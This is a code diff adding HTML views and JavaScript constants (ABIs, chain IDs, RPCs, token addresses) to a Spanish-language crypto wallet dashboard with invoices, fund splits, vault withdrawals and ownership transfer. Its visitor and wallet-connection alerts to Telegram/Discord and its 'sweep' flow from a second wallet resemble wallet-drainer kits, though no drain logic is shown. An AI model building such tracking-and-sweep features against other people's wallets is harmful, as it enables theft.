+            <div class="grid grid-cols-2 gap-3">
+              <div><label class="label">Monto</label><input class="field mono mt-1.5" placeholder="0.0"/></div>
+              <div><label class="label">Vence (h)</label><input class="field mono mt-1.5" value="24"/></div>
+            </div>
+            <div>
+              <label class="label">Pagador (opcional)</label>
+              <input class="field mono mt-1.5" placeholder="0x… (vacío = cualquiera)"/>
+            </div>
+          </div>
+          <button class="btn btn-primary w-full mt-5">Crear invoice</button>
+        </div>
+
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center gap-3 mb-3">
+            <div class="nav-ic" style="width:38px;height:38px;background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#fff">🔍</div>
+            <div>
+              <div class="label">Consultar</div>
+              <h3 class="h-display text-xl">Buscar invoice</h3>
+            </div>
+          </div>
+          <div>
+            <label class="label">ID / Etiqueta</label>
+            <input class="field mono mt-1.5" placeholder="ej: factura-001"/>
+          </div>
+          <div class="mt-5 grid grid-cols-2 gap-3 text-sm">
+            <div class="p-3 rounded-xl bg-slate-50"><div class="label mb-1">Token</div><div class="font-semibold">—</div></div>
+            <div class="p-3 rounded-xl bg-slate-50"><div class="label mb-1">Monto</div><div class="font-semibold">—</div></div>
+            <div class="p-3 rounded-xl bg-slate-50"><div class="label mb-1">Pagador</div><div class="font-semibold">—</div></div>
+            <div class="p-3 rounded-xl bg-slate-50"><div class="label mb-1">Estado</div><span class="chip chip-warn">⏳ Pendiente</span></div>
+          </div>
+          <div class="mt-4 flex gap-2 flex-wrap">
+            <button class="btn btn-primary">Pagar</button>
+            <button class="btn btn-danger">Cancelar</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================== -->
+    <!-- VIEW: SPLITS                                 -->
+    <!-- =========================================== -->
+    <section class="view" data-view="splits">
+      <div class="card card-lg glass soft-shadow mb-5">
+        <h2 class="h-display text-2xl">División de fondos</h2>
+        <p class="text-slate-500 text-sm mt-1 max-w-2xl">
+          Configurá hasta N destinatarios con porcentajes en bps (10000 = 100%) y distribuí ETH o ERC-20 en un click.
+        </p>
+      </div>
+
+      <div class="grid gap-5" style="grid-template-columns:1fr">
+        <div class="card card-lg glass soft-shadow" id="splitsEditor">
+          <div class="flex items-center justify-between mb-4 flex-wrap gap-3">
+            <div>
+              <div class="label">Destinatarios</div>
+              <h3 class="h-display text-xl">Configuración de splits</h3>
+              <p class="text-xs text-slate-500 mt-1">La suma debe dar exactamente 10000 bps.</p>
+            </div>
+            <button class="btn btn-soft" onclick="addSplitRow()">＋ Añadir</button>
+          </div>
+
+          <div id="splitRows" class="space-y-2.5">
+            <!-- filled by JS -->
+          </div>
+
+          <div class="mt-5 flex items-center justify-between flex-wrap gap-3">
+            <div class="text-sm">
+              <span class="label mr-2">Total</span>
+              <span id="splitTotal" class="font-bold text-emerald-600">0 bps · 0.00%</span>
+            </div>
+            <button class="btn btn-primary">💾 Guardar splits</button>
+          </div>
+        </div>
+
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center justify-between flex-wrap gap-3 mb-4">
+            <div>
+              <div class="label">Distribuir</div>
+              <h3 class="h-display text-xl">Pagar a los destinos</h3>
+            </div>
+            <div class="seg">
+              <button class="active">ETH</button>
+              <button>ERC-20</button>
+            </div>
+          </div>
+          <div>
+            <label class="label">Monto (vacío = todo)</label>
+            <input class="field mono mt-1.5" placeholder="0.0"/>
+          </div>
+          <button class="btn btn-primary w-full mt-5">📤 Distribuir</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================== -->
+    <!-- VIEW: WALLETS (per-chain)                    -->
+    <!-- =========================================== -->
+    <section class="view" data-view="wallets">
+      <div class="card card-lg glass soft-shadow mb-5">
+        <h2 class="h-display text-2xl">Mis Wallets</h2>
+        <p class="text-slate-500 text-sm mt-1 max-w-2xl">
+          Una tarjeta por cada red. Pegás la dirección del <strong>AssetVault</strong> desplegado en esa red y ya podés operar.
+          La dirección de destino es la de tu wallet conectada (en EVM la misma sirve para las 6).
+        </p>
+      </div>
+
+      <!-- Resumen rápido -->
+      <div class="grid-3 mb-5">
+        <div class="card glass soft-shadow">
+          <div class="label">Wallet A · destino</div>
+          <div id="wWallet" class="font-bold mono text-sm mt-1.5 break-all">—</div>
+        </div>
+        <div class="card glass soft-shadow">
+          <div class="label">Bóvedas configuradas</div>
+          <div id="wConfigured" class="h-display text-2xl mt-1">0 / 6</div>
+        </div>
+        <div class="card glass soft-shadow">
+          <div class="label">Red activa</div>
+          <div id="wActive" class="font-bold mt-1.5">—</div>
+        </div>
+      </div>
+
+      <!-- ===== WALLET B (origen) ===== -->
+      <div class="card card-lg glass soft-shadow mb-5" style="border:1.5px solid #c4b5fd">
+        <div class="flex items-start justify-between gap-3 flex-wrap mb-3">
+          <div class="flex items-center gap-3">
+            <div class="nav-ic" style="width:42px;height:42px;background:linear-gradient(135deg,#a78bfa,#7c3aed);color:#fff;font-size:1.2rem">B</div>
+            <div>
+              <h3 class="h-display text-xl">Wallet de origen (B)</h3>
+              <p class="text-xs text-slate-500 mt-0.5">Donde están los fondos hoy. Leemos saldos sin necesidad de conectarla.</p>
+            </div>
+          </div>
+          <!-- Badge destA -->
+          <div class="flex flex-col items-end gap-1">
+            <span id="destABadge" class="hidden chip chip-ok text-[11px] mono"></span>
+            <button class="text-[11px] text-slate-400 hover:text-rose-500 underline"
+              onclick="if(confirm('¿Cambiar Wallet A?')){localStorage.removeItem('destA');location.reload();}">
+              ↺ Cambiar Wallet A
+            </button>
+          </div>
+        </div>
+
+        <div class="flex gap-2">
+          <input id="walletBInput" class="field mono text-xs flex-1" placeholder="0x… dirección de tu Wallet B (origen)"
+                 value="" oninput="localStorage.setItem('walletB', this.value.trim())"/>
+          <button class="btn btn-primary text-xs" style="padding:.6rem 1rem" onclick="readWalletB()">🔍 Leer saldos</button>
+        </div>
+        <div class="text-[11px] text-slate-500 mt-2 leading-relaxed">
+          <strong>Flujo:</strong> 1 · conectá <em>Wallet A</em> (destino) → 2 · pegá dirección de B → 3 · recargá gas si falta
+          → 4 · conectá <em>Wallet B</em> en Trust → se detecta sola y aparecen botones de barrido.
+        </div>
+
+        <div id="walletBResults" class="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3"></div>
+      </div>
+
+      <!-- Grid de chains EVM -->
+      <div class="grid-2 mb-5" id="walletsGrid"></div>
+
+      <!-- Tron · special -->
+      <div class="card card-lg glass soft-shadow" style="border:1.5px dashed #d4d4d8">
+        <div class="flex items-start gap-3 flex-wrap">
+          <div class="nav-ic" style="width:46px;height:46px;background:linear-gradient(135deg,#ff0633,#a30022);color:#fff;font-size:1.2rem">◆</div>
+          <div class="flex-1 min-w-[220px]">
+            <div class="flex items-center gap-2 flex-wrap">
+              <h3 class="h-display text-xl">Tron</h3>
+              <span class="chip chip-warn">TVM · deploy aparte</span>
+            </div>
+            <p class="text-xs text-slate-500 mt-1.5 leading-relaxed">
+              Tron no es EVM. Tu <strong>AssetVault</strong> debe portarse y desplegarse con
+              <a class="text-indigo-600 underline" href="https://tronbox.io" target="_blank">TronBox</a> o TronWeb.
+              Foundry no funciona acá. La integración del panel para Tron requiere TronWeb
+              (la podemos sumar después).
+            </p>
+          </div>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mt-4">
+          <div>
+            <label class="label">SC AssetVault en Tron (cuando lo despliegues)</label>
+            <input class="field mono text-xs mt-1.5" id="vaultTron" placeholder="TR... base58 (próximamente)" disabled style="opacity:.5"/>
+          </div>
+          <div>
+            <label class="label">Tu dirección de destino en Tron</label>
+            <div class="relative mt-1.5">
+              <input class="field mono text-xs pr-12" id="destTron" placeholder="TR... (Trust → Recibir → Tron)"
+                     onchange="saveOtherAddr('tron', this.value)"/>
+              <button class="absolute right-2 top-1/2 -translate-y-1/2 text-xs px-2 py-1 rounded-md hover:bg-slate-100" onclick="copyOtherAddr('tron')">📋</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================== -->
+    <!-- VIEW: OWNER                                  -->
+    <!-- =========================================== -->
+    <section class="view" data-view="owner">
+      <div class="card card-lg glass soft-shadow mb-5">
+        <h2 class="h-display text-2xl">Owner</h2>
+        <p class="text-slate-500 text-sm mt-1 max-w-2xl">
+          Transferencia de ownership en dos pasos. La firma sigue siendo tuya hasta que el nuevo owner acepte.
+        </p>
+      </div>
+
+      <div class="grid-2">
+        <div class="card card-lg glass soft-shadow">
+          <div class="label">Owner actual</div>
+          <div id="ownerCurrent" class="h-display text-xl mono mt-2">—</div>
+          <div id="ownerIsMe" class="hidden mt-3 chip chip-ok">✓ Sos vos</div>
+        </div>
+        <div class="card card-lg glass soft-shadow">
+          <div class="label">Pendiente de aceptación</div>
+          <div id="ownerPending" class="h-display text-xl mono mt-2">—</div>
+        </div>
+      </div>
+
+      <div class="grid-2 mt-5">
+        <div class="card card-lg glass soft-shadow">
+          <h3 class="h-display text-xl">Transferir ownership</h3>
+          <p class="text-xs text-slate-500 mt-1">El nuevo owner deberá aceptar.</p>
+          <label class="label mt-4 block">Nueva dirección</label>
+          <input id="newOwner" class="field mono mt-1.5" placeholder="0x…"/>
+          <button class="btn btn-primary w-full mt-4" onclick="transferOwnership()">Iniciar transferencia</button>
+        </div>
+        <div class="card card-lg glass soft-shadow">
+          <h3 class="h-display text-xl">Aceptar ownership</h3>
+          <p class="text-xs text-slate-500 mt-1">Sólo la dirección pendiente puede ejecutar.</p>
+          <button class="btn btn-primary w-full mt-4" onclick="acceptOwnership()">Aceptar</button>
+          <div class="mt-5 p-3 rounded-xl bg-red-50 border border-red-200 text-xs text-red-700">
+            <strong>⚠ Atención:</strong> el dueño controla todos los fondos. Considerá una hardware wallet o multisig.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================== -->
+    <!-- VIEW: ACTIVITY                               -->
+    <!-- =========================================== -->
+    <section class="view" data-view="activity">
+      <div class="card card-lg glass soft-shadow mb-5">
+        <h2 class="h-display text-2xl">Actividad</h2>
+        <p class="text-slate-500 text-sm mt-1 max-w-2xl">
+          Mirá quién entró a tu página y configurá un bot de Telegram que te avise en tiempo real.
+        </p>
+      </div>
+
+      <!-- KPIs -->
+      <div class="grid-3 mb-5">
+        <div class="card glass soft-shadow">
+          <div class="label">Visitas hoy</div>
+          <div id="kpiToday" class="h-display text-3xl mt-1">0</div>
+        </div>
+        <div class="card glass soft-shadow">
+          <div class="label">Últimos 7 días</div>
+          <div id="kpiWeek" class="h-display text-3xl mt-1">0</div>
+        </div>
+        <div class="card glass soft-shadow">
+          <div class="label">Total registrado</div>
+          <div id="kpiTotal" class="h-display text-3xl mt-1">0</div>
+        </div>
+      </div>
+
+      <div class="grid-2">
+        <!-- TELEGRAM CONFIG -->
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center gap-3 mb-3">
+            <div class="nav-ic" style="width:38px;height:38px;background:linear-gradient(135deg,#38bdf8,#0ea5e9);color:#fff">✈</div>
+            <div>
+              <div class="label">Notificaciones</div>
+              <h3 class="h-display text-xl">Bot de Telegram</h3>
+            </div>
+          </div>
+          <p class="text-xs text-slate-500 mb-4 leading-relaxed">
+            Te avisa cada vez que alguien entra a esta página, conecta su wallet o manda una tx.
+          </p>
+
+          <label class="label">Bot Token</label>
+          <input id="tgToken" class="field mono mt-1.5 text-xs" placeholder="123456:ABC-DEF…"/>
+          <label class="label mt-3 block">Chat ID</label>
+          <input id="tgChat" class="field mono mt-1.5 text-xs" placeholder="123456789 o -1001234567890 (grupo)"/>
+
+          <div class="mt-4 flex gap-2 flex-wrap">
+            <button class="btn btn-primary flex-1" onclick="saveTg()">Guardar</button>
+            <button class="btn btn-soft" onclick="testTg()">Enviar test</button>
+            <button class="btn btn-ghost" onclick="clearTg()">Borrar</button>
+          </div>
+
+          <div id="tgStatus" class="hidden mt-3 status-box"></div>
+
+          <details class="mt-4 text-xs text-slate-600">
+            <summary class="cursor-pointer font-semibold text-indigo-600">¿Cómo armo el bot? (3 pasos)</summary>
+            <ol class="mt-2 ml-5 list-decimal space-y-1.5 leading-relaxed">
+              <li>En Telegram, escribile a <a class="text-indigo-600 underline" href="https://t.me/BotFather" target="_blank">@BotFather</a> → <code class="bg-slate-100 px-1 rounded">/newbot</code>. Te da el <strong>token</strong>.</li>
+              <li>Escribile algo a tu bot (cualquier mensaje) para activar el chat.</li>
+              <li>Para sacar tu <strong>chat ID</strong>, escribile a <a class="text-indigo-600 underline" href="https://t.me/userinfobot" target="_blank">@userinfobot</a> o abrí <code class="bg-slate-100 px-1 rounded">https://api.telegram.org/bot&lt;TU_TOKEN&gt;/getUpdates</code> y copiá el <code class="bg-slate-100 px-1 rounded">chat.id</code>.</li>
+            </ol>
+          </details>
+        </div>
+
+        <!-- ACTIVITY LOG -->
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center justify-between gap-3 mb-3">
+            <div class="flex items-center gap-3">
+              <div class="nav-ic" style="width:38px;height:38px;background:linear-gradient(135deg,#fb7185,#f43f5e);color:#fff">📜</div>
+              <div>
+                <div class="label">Registro</div>
+                <h3 class="h-display text-xl">Últimos eventos</h3>
+              </div>
+            </div>
+            <button class="btn btn-ghost text-xs" style="padding:.4rem .8rem" onclick="clearLog()">🗑 Limpiar</button>
+          </div>
+          <div id="activityList" class="space-y-2 max-h-[420px] overflow-y-auto pr-1">
+            <div class="text-center text-slate-400 py-8 text-sm">Sin eventos todavía…</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================== -->
+    <!-- VIEW: CONFIG                                 -->
+    <!-- =========================================== -->
+    <section class="view" data-view="config">
+
+      <div class="card card-lg glass soft-shadow mb-5">
+        <div class="flex items-center gap-3">
+          <div class="nav-ic" style="width:46px;height:46px;background:linear-gradient(135deg,#6691f7,#7c5cff);color:#fff;font-size:1.3rem">⚙</div>
+          <div>
+            <h2 class="h-display text-2xl">Configuración</h2>
+            <p class="text-slate-500 text-sm mt-0.5">Notificaciones por Telegram y Discord cuando alguien accede a tu dApp.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Fila superior: TG + Discord -->
+      <div class="grid-2 mb-5">
+
+        <!-- ── TELEGRAM ───────────────────────────── -->
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center gap-3 mb-4">
+            <div class="nav-ic" style="width:42px;height:42px;background:linear-gradient(135deg,#38bdf8,#0ea5e9);color:#fff;font-size:1.2rem">✈</div>
+            <div>
+              <div class="label">Notificaciones</div>
+              <h3 class="h-display text-xl">Telegram Bot</h3>
+            </div>
+          </div>
+
+          <label class="label">Bot Token</label>
+          <input id="cfgTgToken" class="field mono mt-1.5 text-xs" placeholder="123456:ABC-DEF1234…"
+                 oninput="syncTgInputs()"/>
+
+          <label class="label mt-3 block">Chat ID</label>
+          <input id="cfgTgChat" class="field mono mt-1.5 text-xs" placeholder="123456789  ó  -1001234567890"
+                 oninput="syncTgInputs()"/>
+
+          <div class="mt-4 flex gap-2 flex-wrap">
+            <button class="btn btn-primary flex-1" onclick="saveCfgTg()">💾 Guardar</button>
+            <button class="btn btn-soft" onclick="testCfgTg()">🚀 Test</button>
+            <button class="btn btn-ghost" onclick="clearCfgTg()">✕</button>
+          </div>
+          <div id="cfgTgStatus" class="hidden mt-3 status-box"></div>
+
+          <details class="mt-4 text-xs text-slate-500">
+            <summary class="cursor-pointer font-semibold text-indigo-600">¿Cómo crear el bot? (3 pasos)</summary>
+            <ol class="mt-2 ml-4 list-decimal space-y-1.5 leading-relaxed">
+              <li>En Telegram → <a class="text-indigo-600 underline" href="https://t.me/BotFather" target="_blank">@BotFather</a> → <code class="bg-slate-100 px-1 rounded">/newbot</code> → copiá el token.</li>
+              <li>Mandá cualquier mensaje a tu bot para activar el chat.</li>
+              <li>Tu Chat ID: escribile a <a class="text-indigo-600 underline" href="https://t.me/userinfobot" target="_blank">@userinfobot</a>.</li>
+            </ol>
+          </details>
+        </div>
+
+        <!-- ── DISCORD ────────────────────────────── -->
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center gap-3 mb-4">
+            <div class="nav-ic" style="width:42px;height:42px;background:linear-gradient(135deg,#5865f2,#3d4fc7);color:#fff;font-size:1.1rem">⬡</div>
+            <div>
+              <div class="label">Notificaciones</div>
+              <h3 class="h-display text-xl">Discord Webhook</h3>
+            </div>
+          </div>
+
+          <label class="label">Webhook URL</label>
+          <input id="cfgDcWebhook" class="field mono mt-1.5 text-xs"
+                 placeholder="https://discord.com/api/webhooks/…"/>
+
+          <label class="label mt-3 block">Nombre del bot (opcional)</label>
+          <input id="cfgDcName" class="field mt-1.5 text-sm" placeholder="MyPersonWallets" value="MyPersonWallets"/>
+
+          <div class="mt-4 flex gap-2 flex-wrap">
+            <button class="btn btn-primary flex-1" onclick="saveCfgDc()" style="background:linear-gradient(135deg,#5865f2,#3d4fc7)">💾 Guardar</button>
+            <button class="btn btn-soft" onclick="testCfgDc()">🚀 Test</button>
+            <button class="btn btn-ghost" onclick="clearCfgDc()">✕</button>
+          </div>
+          <div id="cfgDcStatus" class="hidden mt-3 status-box"></div>
+
+          <details class="mt-4 text-xs text-slate-500">
+            <summary class="cursor-pointer font-semibold text-indigo-600">¿Cómo crear el webhook?</summary>
+            <ol class="mt-2 ml-4 list-decimal space-y-1.5 leading-relaxed">
+              <li>En Discord, abrí el canal donde querés recibir avisos.</li>
+              <li>Configuración del canal → Integraciones → Webhooks → Nuevo webhook.</li>
+              <li>Copiá la URL y pegala arriba.</li>
+            </ol>
+          </details>
+        </div>
+      </div>
+
+      <!-- Triggers de notificación -->
+      <div class="card card-lg glass soft-shadow mb-5">
+        <h3 class="h-display text-xl mb-1">¿Cuándo notificar?</h3>
+        <p class="text-xs text-slate-500 mb-4">Marcá los eventos que querés recibir en Telegram y/o Discord.</p>
+        <div class="grid grid-cols-2 md:grid-cols-3 gap-3">
+          <label class="flex items-center gap-2 cursor-pointer select-none">
+            <input type="checkbox" id="notif_visit"   class="accent-indigo-500" checked onchange="saveTriggers()"/>
+            <span class="text-sm">🔔 Visita a la dApp</span>
+          </label>
+          <label class="flex items-center gap-2 cursor-pointer select-none">
+            <input type="checkbox" id="notif_connect" class="accent-indigo-500" checked onchange="saveTriggers()"/>
+            <span class="text-sm">🔌 Wallet conectada</span>
+          </label>
+          <label class="flex items-center gap-2 cursor-pointer select-none">
+            <input type="checkbox" id="notif_tx"      class="accent-indigo-500" checked onchange="saveTriggers()"/>
+            <span class="text-sm">📤 Transacción enviada</span>
+          </label>
+          <label class="flex items-center gap-2 cursor-pointer select-none">
+            <input type="checkbox" id="notif_txok"    class="accent-indigo-500" checked onchange="saveTriggers()"/>
+            <span class="text-sm">✅ Tx confirmada</span>
+          </label>
+          <label class="flex items-center gap-2 cursor-pointer select-none">
+            <input type="checkbox" id="notif_vault"   class="accent-indigo-500"       onchange="saveTriggers()"/>
+            <span class="text-sm">🏦 Bóveda configurada</span>
+          </label>
+          <label class="flex items-center gap-2 cursor-pointer select-none">
+            <input type="checkbox" id="notif_txerr"   class="accent-indigo-500" checked onchange="saveTriggers()"/>
+            <span class="text-sm">⚠ Tx fallida</span>
+          </label>
+        </div>
+      </div>
+
+      <!-- URL de la dApp index -->
+      <div class="card card-lg glass soft-shadow mb-5">
+        <h3 class="h-display text-xl mb-1">URL de tu dApp (index)</h3>
+        <p class="text-xs text-slate-500 mb-3">Se incluye en las notificaciones de visita para saber de qué página llegó el acceso.</p>
+        <div class="flex gap-2">
+          <input id="cfgDappUrl" class="field flex-1 text-sm mono"
+                 placeholder="https://tu-dapp.com  ó  file:///ruta/panel.html"
+                 oninput="localStorage.setItem('dappUrl', this.value.trim())"/>
+          <button class="btn btn-soft text-xs" style="padding:.6rem .9rem"
+                  onclick="$('cfgDappUrl').value=window.location.href; localStorage.setItem('dappUrl',window.location.href); toast('URL actual guardada ✓')">
+            📍 Usar actual
+          </button>
+        </div>
+      </div>
+
+      <!-- Estado / resumen -->
+      <div class="card glass soft-shadow" id="cfgSummary" style="border:1px dashed #c7d2fe">
+        <div class="flex items-center gap-3 flex-wrap">
+          <span id="cfgTgBadge"  class="chip text-xs">TG: no configurado</span>
+          <span id="cfgDcBadge"  class="chip text-xs">Discord: no configurado</span>
+          <span id="cfgTrigBadge" class="chip text-xs chip-ok">Triggers: cargando…</span>
+        </div>
+      </div>
+
+    </section>
+
+  </main>
 </div>
 
-<script type="module">
-import {
-  connectWallet, disconnectWallet, restoreSession, switchChain,
-  getNativeBalance, getErc20Balance, fmtUnits
-} from './js/wallet.js';
+<!-- WALLET MODAL -->
+<div id="walletModal" class="modal-bd" onclick="if(event.target===this) closeWalletModal()">
+  <div class="card card-lg glass soft-shadow w-full max-w-md">
+    <div class="flex items-center justify-between mb-5">
+      <h3 class="h-display text-xl">Elegí tu wallet</h3>
+      <button class="text-slate-400 hover:text-slate-700 text-2xl leading-none" onclick="closeWalletModal()">×</button>
+    </div>
+    <div class="space-y-2.5">
+      <button class="wallet-opt" onclick="connectWC()">
+        <div class="wallet-icon" style="background:#3375bb">T</div>
+        <div class="text-left flex-1">
+          <div class="font-semibold">Trust Wallet · móvil</div>
+          <div class="text-xs text-slate-500">Escaneá el QR con Trust en tu celular</div>
+        </div>
+        <div class="chip" style="font-size:.65rem">QR</div>
+      </button>
+      <button class="wallet-opt" onclick="connect('trust')">
+        <div class="wallet-icon" style="background:linear-gradient(135deg,#3375bb,#1f4e8a)">T</div>
+        <div class="text-left flex-1">
+          <div class="font-semibold">Trust · extensión</div>
+          <div class="text-xs text-slate-500">Si tenés Trust instalada en el navegador</div>
+        </div>
+      </button>
+      <button class="wallet-opt" onclick="connect('metamask')">
+        <div class="wallet-icon" style="background:linear-gradient(135deg,#f6851b,#e2761b)">M</div>
+        <div class="text-left flex-1">
+          <div class="font-semibold">MetaMask</div>
+          <div class="text-xs text-slate-500">Extensión de navegador</div>
+        </div>
+      </button>
+      <button class="wallet-opt" onclick="connect('any')">
+        <div class="wallet-icon" style="background:linear-gradient(135deg,#6691f7,#7c5cff)">↗</div>
+        <div class="text-left flex-1">
+          <div class="font-semibold">Otra wallet inyectada</div>
+          <div class="text-xs text-slate-500">Cualquier wallet con window.ethereum</div>
+        </div>
+      </button>
+    </div>
 
-/* ============================================================
- *  Configuracion de redes
- * ============================================================ */
-const NETWORKS = {
-  '0x1': {
-    name: 'Ethereum', short: 'ETH', chainId: '0x1',
-    gas: { symbol: 'ETH', name: 'Ether (gas)' },
-    explorer: 'https://etherscan.io', color: '#627eea',
-    rpc: 'https://eth.llamarpc.com',
-    tokens: [
-      { symbol: 'USDT', name: 'Tether USD',  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  color: '#26a17b' },
-      { symbol: 'USDC', name: 'USD Coin',    address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  color: '#2775ca' },
-      { symbol: 'DAI',  name: 'Dai',         address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, color: '#f5ac37' },
-      { symbol: 'WBTC', name: 'Wrapped BTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  color: '#f7931a' }
-    ]
-  },
-  '0x38': {
-    name: 'BNB Smart Chain', short: 'BSC', chainId: '0x38',
-    gas: { symbol: 'BNB', name: 'BNB (gas)' },
-    explorer: 'https://bscscan.com', color: '#f3ba2f',
-    rpc: 'https://bsc-dataseed.binance.org',
-    tokens: [
-      { symbol: 'USDT', name: 'Tether USD (BEP20)', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, color: '#26a17b' },
-      { symbol: 'USDC', name: 'USD Coin (BEP20)',   address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, color: '#2775ca' },
-      { symbol: 'BUSD', name: 'Binance USD',         address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, color: '#f0b90b' },
-      { symbol: 'BTCB', name: 'Bitcoin BEP20',       address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18, color: '#f7931a' }
-    ]
-  },
-  '0x89': {
-    name: 'Polygon', short: 'POL', chainId: '0x89',
-    gas: { symbol: 'POL', name: 'POL/MATIC (gas)' },
-    explorer: 'https://polygonscan.com', color: '#8247e5',
-    rpc: 'https://polygon-rpc.com',
-    tokens: [
-      { symbol: 'USDT', name: 'Tether USD',  address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6,  color: '#26a17b' },
-      { symbol: 'USDC', name: 'USD Coin',    address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6,  color: '#2775ca' },
-      { symbol: 'DAI',  name: 'Dai',         address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals: 18, color: '#f5ac37' }
-    ]
-  },
-  '0xa86a': {
-    name: 'Avalanche', short: 'AVAX', chainId: '0xa86a',
-    gas: { symbol: 'AVAX', name: 'AVAX (gas)' },
-    explorer: 'https://snowtrace.io', color: '#e84142',
-    rpc: 'https://api.avax.network/ext/bc/C/rpc',
-    tokens: [
-      { symbol: 'USDT', name: 'Tether USD', address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', decimals: 6, color: '#26a17b' },
-      { symbol: 'USDC', name: 'USD Coin',   address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', decimals: 6, color: '#2775ca' }
-    ]
-  },
-  '0xa4b1': {
-    name: 'Arbitrum', short: 'ARB', chainId: '0xa4b1',
-    gas: { symbol: 'ETH', name: 'Ether en Arbitrum (gas)' },
-    explorer: 'https://arbiscan.io', color: '#28a0f0',
-    rpc: 'https://arb1.arbitrum.io/rpc',
-    tokens: [
-      { symbol: 'USDT', name: 'Tether USD', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, color: '#26a17b' },
-      { symbol: 'USDC', name: 'USD Coin',   address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, color: '#2775ca' }
-    ]
+    <!-- Lista de redes que pediremos en el handshake -->
+    <div class="mt-5 p-3 bg-slate-50 border border-slate-200 rounded-2xl">
+      <div class="label mb-2">Redes solicitadas</div>
+      <div id="chainsList" class="flex flex-wrap gap-1.5"></div>
+      <div class="text-[11px] text-slate-500 mt-2 leading-relaxed">
+        Trust te mostrará todas estas redes en una sola pantalla cuando uses WalletConnect.
+      </div>
+    </div>
+
+    <div id="walletHint" class="hidden mt-4 p-3 bg-amber-50 border border-amber-200 rounded-2xl text-xs text-amber-800"></div>
+  </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+/* ===== ABIs ===== */
+const VAULT_ABI = [
+  "function owner() view returns (address)",
+  "function pendingOwner() view returns (address)",
+  "function transferOwnership(address)",
+  "function acceptOwnership()",
+  "function withdrawETH(address to, uint256 amount)",
+  "function withdrawETHAll(address to)",
+  "function withdrawERC20(address token, address to, uint256 amount)"
+];
+const ERC20_ABI = [
+  "function decimals() view returns (uint8)",
+  "function symbol() view returns (string)",
+  "function balanceOf(address) view returns (uint256)"
+];
+
+/* Chains que el dApp pide en el handshake — Trust las muestra exactamente así. */
+const SUPPORTED_CHAINS = [
+  { id: 1,     name: 'Ethereum',         symbol: 'ETH',   icon: '⟠',  color: '#627eea' },
+  { id: 137,   name: 'Polygon',          symbol: 'POL',   icon: '⬣',  color: '#8247e5' },
+  { id: 8453,  name: 'Base',             symbol: 'ETH',   icon: '◧',  color: '#0052ff' },
+  { id: 43114, name: 'Avalanche C-Chain',symbol: 'AVAX',  icon: '▲',  color: '#e84142' },
+  { id: 42161, name: 'Arbitrum',         symbol: 'ETH',   icon: '◆',  color: '#28a0f0' },
+  { id: 56,    name: 'BNB Smart Chain',  symbol: 'BNB',   icon: '◈',  color: '#f0b90b' },
+];
+const CHAIN_NAMES = Object.fromEntries(SUPPORTED_CHAINS.map(c => [c.id, c.name]));
+CHAIN_NAMES[11155111] = 'Sepolia';
+CHAIN_NAMES[31337]    = 'Localhost';
+CHAIN_NAMES[1337]     = 'Localhost';
+
+/* RPCs públicas (sin API key) para leer saldos sin estar conectado a esa red. */
+const PUBLIC_RPCS = {
+  1:     'https://eth.llamarpc.com',
+  137:   'https://polygon-rpc.com',
+  8453:  'https://mainnet.base.org',
+  43114: 'https://api.avax.network/ext/bc/C/rpc',
+  42161: 'https://arb1.arbitrum.io/rpc',
+  56:    'https://bsc-dataseed.binance.org',
+};
+
+/* Tokens populares por chain (USDT/USDC). Si tenés más, sumalos acá. */
+const COMMON_TOKENS = {
+  1: [
+    { symbol:'USDT', addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7', dec:6 },
+    { symbol:'USDC', addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', dec:6 },
+    { symbol:'DAI',  addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F', dec:18 },
+  ],
+  137: [
+    { symbol:'USDT', addr:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F', dec:6 },
+    { symbol:'USDC', addr:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', dec:6 },
+  ],
+  8453: [
+    { symbol:'USDC', addr:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', dec:6 },
+  ],
+  43114: [
+    { symbol:'USDT', addr:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', dec:6 },
+    { symbol:'USDC', addr:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', dec:6 },
+  ],
+  42161: [
+    { symbol:'USDT', addr:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', dec:6 },
